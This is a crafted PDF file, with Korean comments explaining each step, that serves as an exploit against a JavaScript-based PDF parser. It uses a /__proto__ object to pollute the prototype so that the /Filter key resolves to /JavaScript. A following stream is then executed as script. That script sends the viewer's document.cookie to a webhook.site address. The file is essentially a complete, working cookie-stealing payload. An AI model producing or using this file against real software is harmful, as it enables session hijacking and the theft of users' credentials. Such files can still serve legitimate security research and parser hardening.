%PDF-1.7

1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

3 0 obj
<< 
  /Type /Page
  /Parent 2 0 R
  /MediaBox [0 0 600 800]
  /Resources <<>>
  % 페이지 내용으로 두 개의 스트림을 모두 포함시킵니다.
  /Contents [4 0 R 6 0 R]
>>
endobj

% 스트림 1: 프로토타입 오염용
4 0 obj
<<
  /Length 1
  % 이 부분이 객체 5를 통해 프로토타입 오염을 유발합니다.
  /Encoed [ 5 0 R ]
>>
stream
P
endstream
endobj

% 프로토타입 오염 페이로드
5 0 obj
<<
  /__proto__ <<
    % 'Filter' 속성을 오염시킵니다. 이제 'Filter'가 없는 모든 객체는
    % 이 값을 상속받아 /JavaScript 필터를 가진 것처럼 보입니다.
    /Filter /JavaScript
  >>
>>
endobj

% 스트림 2: 코드 실행용
6 0 obj
<<
  % 이 객체에는 /Filter 키가 없습니다. 파서는 프로토타입 체인을 따라
  % 우리가 오염시킨 /JavaScript 필터를 사용하게 됩니다.
  /Length 95
>>
stream
window.location='https://webhook.site/4cea2e4b-cd66-4c12-adf3-a0a0fc51ffe3/?c=' + document.cookie;
endstream
endobj

trailer
<< /Root 1 0 R >>
